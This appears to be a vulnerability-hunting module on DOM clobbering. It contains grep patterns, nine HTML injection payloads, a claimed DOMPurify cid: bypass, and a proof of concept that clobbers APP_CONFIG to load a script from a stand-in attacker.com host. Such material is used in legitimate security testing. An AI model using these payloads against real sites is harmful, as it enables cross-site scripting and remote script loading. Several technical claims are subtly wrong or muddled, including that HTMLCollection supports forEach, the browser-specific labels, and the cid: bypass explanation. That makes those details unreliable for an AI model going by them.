# VULN MODULE — DOM Clobbering
# Asset: webapp
# CWE-79 | Report prefix: WEB-DOMCLOB

## THREAT MODEL

DOM clobbering is an attack where HTML injection (without script execution) is used
to overwrite global JavaScript variables or properties. Named HTML elements
(`id`, `name`) are accessible as `window.id` / `document.id`, allowing attacker-
controlled HTML to pollute the global scope and redirect code execution.

Attack surface:
- Applications that allow HTML injection but block `<script>` / event handlers
- DOMPurify-sanitized HTML rendered client-side (specific bypass via `cid:`)
- Any JavaScript that reads `window.<name>` or `document.<name>` where name
  matches attacker-injectable HTML element IDs

## VULNERABILITY CLASSES

1. Global variable clobbering  CWE-79 — overwrite window.config, window.options
2. Property chain clobbering   CWE-79 — overwrite obj.property via nested elements
3. DOMPurify bypass            CWE-79 — cid: protocol survives sanitization

## WHITEBOX PATTERNS

```bash
# Code reads from window or document global properties (potential clobber targets)
grep -rn "window\.\|document\.\|self\.\|top\." --include="*.js" --include="*.ts" | \
  grep -v "window\.location\|window\.addEventListener\|window\.open\|document\.getElementById" | \
  grep -E "\.(src|href|url|action|config|options|data|callback|handler)\b"

# DOMPurify usage (check for cid: whitelist)
grep -rn "DOMPurify\|sanitize\|createHTMLDocument" --include="*.js" --include="*.ts" -A10 | \
  grep -i "ALLOWED_URI_REGEXP\|cid:\|ALLOW_UNKNOWN_PROTOCOLS"

# innerHTML / outerHTML with sanitized content
grep -rn "innerHTML\s*=\|outerHTML\s*=" --include="*.js" --include="*.ts" -B5
```

## PAYLOAD PATTERNS

### 1. Simple global clobber (window.x)

```html
<!-- Clobbers window.x — value is the element itself (HTMLElement) -->
<img id="x" src="1">

<!-- Access: window.x → HTMLImageElement (truthy) -->
<!-- If code does: if (window.x) { loadScript(window.x.src) } → XSS -->
```

### 2. Two-level: window.x.y

```html
<!-- Use <a> with <a> inside a <form> — only form + specific nested elements work -->
<form id="x"><input id="y" value="javascript:alert(1)"></form>

<!-- window.x → HTMLFormElement -->
<!-- window.x.y → HTMLInputElement -->
<!-- window.x.y.value → "javascript:alert(1)" -->
```

### 3. Three-level: window.x.y.z

```html
<!-- HTMLCollection via same id, then named property -->
<a id="x"><a id="x" name="y" href="javascript:alert(1)">

<!-- window.x → HTMLCollection of two <a> elements -->
<!-- window.x.y → second <a> (by name="y") -->
<!-- window.x.y.href → "javascript:alert(1)" -->
```

### 4. Four-level: window.x.y.z.w

```html
<!-- Combine form + input for deep chain -->
<form id="x" name="y"><input id="z" name="w" value="javascript:alert(1)"></form>

<!-- window.x → HTMLFormElement -->
<!-- window.x.y → same form element (name) -->
<!-- document.getElementById('x').z → HTMLInputElement -->
```

### 5. Clobber document.getElementById

```html
<!-- Clobbers document.getElementById to return attacker element -->
<img id="getElementById" name="getElementById">

<!-- After injection: document.getElementById('foo') → undefined (broken) -->
<!-- More impactful: if app uses document.getElementById result as URL -->
```

### 6. Clobber HTMLFormElement.action

```html
<form id="target" action="javascript:alert(1)"></form>

<!-- If code does: document.getElementById('target').submit() → executes JS -->
```

### 7. Clobber with forEach (HTMLCollection)

```html
<!-- Two elements with same id → HTMLCollection, which has forEach -->
<a id="x">foo</a>
<a id="x">bar</a>

<!-- window.x.forEach(fn) — HTMLCollection supports forEach in modern browsers -->
```

### 8. username / password properties (Firefox-specific)

```html
<!-- Firefox exposes username and password on HTMLAnchorElement -->
<a id="config" name="password" href="x:x">

<!-- window.config.password → "x:x" split as password part of URL -->
```

### 9. Chrome-specific: window.name persistence

```html
<!-- window.name persists across same-origin navigations -->
<!-- If code reads window.name without validation → inject via open() or iframe name -->
<iframe name="javascript:alert(1)" src="target.com/page">
```

## DOMPurify BYPASS — cid: PROTOCOL

DOMPurify (before fix) allowed `cid:` URIs which can be used to inject `id` values
that survive sanitization:

```html
<!-- Payload that survives DOMPurify sanitization -->
<a id="defaultView" name="cid:"><a id="defaultView" name="cid:" href="javascript:alert(1)">

<!-- The cid: trick: DOMPurify uses createHTMLDocument() internally,
     where the anchor's href pointing to cid: is not stripped.
     After sanitization: document.defaultView (window) is clobbered. -->
```

Verify DOMPurify version — fixed in versions that added `cid:` to blocked protocols.

## EXPLOITATION CONTEXT

DOM clobbering is most impactful when combined with:

1. **Gadget in loaded scripts** — third-party JS that reads `window.config.scriptUrl`
2. **innerHTML sinks** — sanitized HTML written to page, then script reads from DOM
3. **eval/setTimeout gadgets** — `window.onload = window.callback` where callback is clobbered

### Example end-to-end PoC

```html
<!-- Target code (legitimate): -->
<script>
  var config = window.APP_CONFIG || {};
  document.write('<script src="' + config.scriptUrl + '"><\/script>');
</script>

<!-- Attacker injects (via HTML injection, no script tags): -->
<a id="APP_CONFIG" name="scriptUrl" href="https://attacker.com/malicious.js">
```

## TOOLS

```bash
# DOM Invader (Burp Suite Pro) — detects clobbering sinks automatically
# Lighthouse DOM Clobbering audit

# Manual test: inject into any HTML field, then check browser console:
# Open DevTools console, type: window.<injected-id>
# If it returns your element → clobbering possible
```
